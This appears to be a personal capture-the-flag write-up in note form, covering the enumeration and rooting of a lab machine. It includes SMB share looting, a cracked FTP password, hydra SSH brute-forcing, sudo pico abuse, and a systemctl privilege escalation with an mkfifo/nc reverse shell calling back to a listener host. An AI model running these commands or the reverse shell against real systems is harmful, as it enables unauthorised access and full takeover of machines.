

export IP=192.168.99.105

nmap -sC -sV $IP

=> Use msfconsole and check ftp version is exploit or not

searchsploit vsftpd 3.0.3    => Check with manual

ftp 192.168.99.105   => i try to connect with ftp but  its fail!

site help      => i also use this command to enumate

smbmap -H 192.168.99.105     => cuz i found smbp port in 445

smbclient //192.168.99.105/anonymous -N   => cuz i found anonymous file 

get share  => i downloaded share file

![[Pasted image 20230109212959.png]]

I get this information from share file that i downloaded  => include ftp username and password


hash-identifier    => i try to know which hashing algoram use for hashing

https://hashes.com/en/decrypt/hash   => decrypt

Finally i found user name and password for FTP server 
-> admin
->qazwsxedc

 cd /     => go to root  dictory   => we get user access


SSH username and password also same with FTP service

----------------------------------

Rooting Rootin Rooting

find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null    -> suid enum

uname -a    -> version check 

cat /etc/*release  -> os ko kyi dar

==> we go to misconfigulation

ls -al /opt       => most interesting ka opt  && var && var->log &&  var -> www && 

=> hydra -l valex -P useful.txt 192.168.99.105 -t 4 ssh   -> we brute with his secret 

==> we using linpeas 

![[Pasted image 20230123214800.png]]
 We think jin user can have access to excute systemctl    <><><>

![[Pasted image 20230123215559.png]]
We also see this many txt files

so we inquire this and we notice one file is not same with other file
![[Pasted image 20230123215528.png]]

![[Pasted image 20230123215842.png]]
we found this one from different txt file

*** hydra -l valex -P useful.txt 192.168.99.105 ssh -t 4 -e nsr   -> nsr ka username ko reverse loke dr  => good option for hydra

![[Pasted image 20230123220803.png]]
we got this one -> su valex *****

![[Pasted image 20230123220859.png]]

We are going to GTFO bin to get shell access // that's have sir !!!
![[Pasted image 20230123221728.png]]

sudo -u jin /usr/bin/pico
and then using this script 
![[Pasted image 20230123223201.png]]

![[Pasted image 20230123223233.png]]
Dummm!! man we got jin user

If we got jin user we will abuse with systemctl command -> we was known at linpeas

We are going to GTFO bIN
```

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```

we replace with Execstart in reverse shell =>  ExecStart=/bin/sh -c "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.99.116 4242 >/tmp/f"

and then remove ./   

nc -lvp 4242 

Done   ### We got root 

![[Pasted image 20230123224632.png]]
